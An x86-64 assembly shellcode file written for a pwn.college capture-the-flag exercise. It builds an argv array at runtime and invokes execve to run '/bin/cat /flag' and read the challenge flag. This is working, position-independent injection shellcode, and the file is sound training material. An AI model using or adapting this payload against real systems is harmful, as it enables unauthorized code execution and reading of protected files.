# This is has_zero, but we put the ".data" stuff at the end to make pwn.college happy
# ALSO: We manually patch the argv array to make it rip-relative
# This will coredump because it violates .text read-only stuff, but in shellcode, it's fine

.intel_syntax noprefix
.global _start      # Start program at _start

.text      # Start text section

_start:

# First, begin by patching the argv array
lea rcx, [rip + argv]           # Get the argv array
lea rax, [rip + cat_str]        # Get dynamic address of cat_str and flag_str
lea rbx, [rip + flag_str]

# Dynamically patch the argv array with the correct addresses
mov [rcx], rax                  # argv[0] = address of "/bin/cat"
mov [rcx+8], rbx                # argv[1] = address of "/flag"

# execve("/bin/cat", ["/bin/cat", "/flag"], NULL)
# https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ - Syscall table
mov rax, 59
lea rdi, [rip + cat_str]        # Symbolic relocation will be implicitly RIP relative, so 
lea rsi, [rip + argv]             # Second arg is argv
mov rdx, 0

syscall                         # Invoke the syscall!

argv:
    .quad 0                     # Declare a placeholder for cat_str
    .quad 0                     # Declare a placeholder for flag_str
    .quad 0                     # argv needs to be null term'd

cat_str:
    .asciz "/bin/cat"            # Declare a string /bin/cat. asciz null terms this

flag_str:
    .asciz "/flag"               # Declare a string /path. This is what we want to read
